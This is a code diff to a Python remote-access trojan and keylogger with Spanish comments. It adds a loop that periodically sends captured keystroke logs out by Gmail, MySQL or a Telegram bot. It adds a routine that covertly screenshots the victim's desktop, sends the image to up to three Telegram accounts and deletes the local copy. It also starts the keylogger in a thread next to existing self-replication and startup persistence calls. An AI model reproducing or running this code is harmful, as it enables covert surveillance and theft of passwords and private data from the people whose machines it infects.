@@ -126,7 +126,58 @@ class Util:
             print("[CreateFolders] - Exito al crear la ruta: " + Config().PATH_KEY)
         except:
             print("[CreateFolders] - La carpeta ya existe: " + Config().PATH_KEY)
+class Send:
+    def __init__(self):
+        pass
+    def Log(self):
+        print("[SendLog] Active...")
+        while True:
+            print("[SendLog] El tiempo de espera es: " + str(Config().TIME_SEND) + "minutos")
+            time.sleep(Config().TIME_SEND * 60)  # Tiempo de espera por minutos
+            #time.sleep(10) # Solo antigueeo
+            if Functions().VerifyConnection():
+                if Config().MODE_SEND == 0:
+                    Util().SendGmail()
+                if Config().MODE_SEND == 1:
+                    Util().MySQL()
+                if Config().MODE_SEND == 2:
+                    Util().TelegramBot()
+    def ScreenShot(self):
+        if Config().SCREENSHOT:
+            print("[ScreenShot] Active...")
+            while True:
+                print("[ScreenShot] Wait: " + str(Config().TIME_SCREENSHOT)+ "Minutes")
+                time.sleep(Config().TIME_SCREENSHOT * 60)
+                if Functions().VerifyConnection():
+                    PATH_SCREEN = Config().PATH_HIDDEN_LOG + str(getuser()) + " - " + Functions().CurrentTime() + ".jpg"
+                    # Toma captura
+                    screenshot = ImageGrab.grab()
+                    print("[ScreenShot] Se tomó una captura ")
+                    screenshot.save(PATH_SCREEN)
+                    print("[ScreenShot] Se guardó correctamente la captura")
 
+                    # Envía a distintas cuentas simultaneamente
+                    if Config.TelegramBot().ID != 000000000:
+                        print("[Send ScreenShot] ID Aceptado")
+                        Util().SendBotScreenShot(Config.TelegramBot().ID, PATH_SCREEN)
+
+                    if Config.TelegramBot().ID_2 != 000000000:
+                        print("[Send ScreenShot] ID 2 Aceptado")
+                        Util().SendBotScreenShot(Config.TelegramBot().ID_2, PATH_SCREEN)
+
+                    if Config.TelegramBot().ID_3 != 000000000:
+                        print("[Send ScreenShot] ID 3 Aceptado")
+                        Util().SendBotScreenShot(Config.TelegramBot().ID_3, PATH_SCREEN)
+
+                    # Se terminó de enviar
+                    try:
+                        os.remove(PATH_SCREEN)
+                        print("[ScreenShot] Se eliminó caché")
+                    except:
+                        print("[ScreenShot] No se pudo eliminar el caché ")
+
+        else:
+            print("[ScreenShot] Disable...")
 
 class Keylogger:
     def __init__(self):
@@ -320,7 +371,6 @@ class Keylogger:
         with Listener(on_press=on_press) as listener:  # Escucha pulsaciones de teclas
             listener.join()
 
-
 def handle(msg):
     command = msg['text']           # Recibe el texto que el usuario mande al bot
     ID = Config.TelegramBot().ID    # ID personal
@@ -403,10 +453,15 @@ def handle(msg):
 # Starting Script
 if __name__ == '__main__':
     print("[RAT] Start")
+
     # Keylogger
     print("[Keylogger] start...")
     Util().Trojan()  # Reply system
     Util().addStartUp()  # Added in Startup
+
+    # Create threads
+    p1 = threading.Thread(target=Keylogger().GetKeys)  # Registra pulsaciones
+    p1.start()
 
     # Instancia configuración
     TB = Config()
